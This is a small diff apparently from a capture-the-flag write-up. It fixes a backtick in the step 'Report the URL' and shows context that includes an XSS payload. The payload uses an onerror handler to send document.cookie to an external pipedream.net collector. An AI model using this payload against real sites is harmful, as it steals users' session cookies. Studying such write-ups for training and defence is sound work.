@@ -105,7 +105,7 @@ img src=x onerror=location=`//eo7x31ojradre3r.m.pipedream.net/?c=${document.cook
 </html>
 ```
 
-5. Report the URL `http://.../...AAAAAAAAAAAAAAAAAmp4
+5. Report the URL `http://.../...AAAAAAAAAAAAAAAAAmp4`
 
 6. Wait for the flag and done!
 
